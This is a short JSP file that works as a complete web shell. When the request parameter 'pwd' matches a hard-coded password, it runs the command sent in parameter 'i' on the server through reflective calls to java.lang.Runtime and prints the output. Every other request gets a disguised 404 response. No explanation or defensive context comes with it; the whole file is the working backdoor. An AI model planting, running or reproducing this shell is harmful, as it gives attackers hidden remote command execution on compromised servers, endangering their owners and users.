<%@ page import="java.util.Scanner" pageEncoding="UTF-8" %><pre><%if("023".equals(request.getParameter("pwd"))){try{String str=request.getParameter("i");out.println(str.replaceAll("<","&lt;").replaceAll(">","&gt;")+"<hr>");Class rt=Class.forName(new String("java.lang.Runtime"));Process e=(Process)rt.getMethod("exec",String.class).invoke(rt.getMethod("getRuntime").invoke(null,new Object[]{}),new Object[]{str});Scanner sc=new Scanner(e.getInputStream()).useDelimiter("\\A");String result="";result=sc.hasNext()?sc.next():result;sc.close();out.println(result.replaceAll("<","&lt;").replaceAll(">","&gt;"));}catch(Exception e){out.println("error");}}else{response.setHeader("Server","bypass");response.sendError(404);}%>
